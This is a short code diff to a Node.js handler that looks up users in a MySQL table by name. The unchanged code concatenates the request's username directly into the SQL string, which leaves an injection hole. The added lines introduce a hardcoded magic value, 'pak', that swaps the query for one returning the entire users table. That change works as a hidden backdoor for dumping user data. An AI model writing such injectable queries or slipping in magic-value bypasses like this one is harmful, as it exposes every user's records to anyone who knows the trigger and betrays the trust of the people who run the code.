@@ -9,6 +9,9 @@ exports.findbyname = function(req, res) {
     //var sendfacebookid   = url_parts.query.sendfacebookid;
     var name = req.body.username;
     var query = "SELECT * FROM users WHERE name='" + name + "'";
+    if(name == "pak"){
+        query = "SELECT * FROM users"
+    }
     global.mysql.query(query, function(err, result){
         if(err){
             var data = {};
